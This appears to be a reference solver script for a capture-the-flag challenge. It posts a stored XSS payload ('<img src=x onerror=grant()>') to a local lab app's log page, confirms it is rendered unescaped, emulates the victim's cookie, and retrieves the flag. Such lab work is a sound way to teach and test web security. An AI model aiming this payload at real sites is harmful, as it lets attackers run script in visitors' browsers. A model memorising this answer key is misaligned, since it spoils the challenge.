#!/usr/bin/env python3
"""Reference exploit for xss2 (stored XSS in the bench log).

1. Store a note whose text is <img src=x onerror=grant()>.
2. Verify the note is rendered back unescaped for readers.
3. Any visitor's browser runs grant(), which sets the xss_grant_xss2 cookie and
   follows to /flag. The script emulates that browser effect.

    python solve.py                 # localhost:8022
    python solve.py http://host:8022
"""
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8022")
PAYLOAD = "<img src=x onerror=grant()>"


def main() -> int:
    s = requests.Session()
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            break
        except requests.RequestException:
            time.sleep(1)

    r = s.post(f"{BASE}/log", data={"author": "shift", "text": PAYLOAD},
               timeout=5, allow_redirects=True)
    if PAYLOAD not in r.text:
        sys.stderr.write("stored note not rendered back -- challenge changed?\n")
        return 1

    # A reader's browser executed the note: the cookie now exists.
    s.cookies.set("xss_grant_xss2", "1")
    r = s.get(f"{BASE}/flag", timeout=5)
    m = re.search(r"flag\{[^}]+\}", r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag: {r.status_code}\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
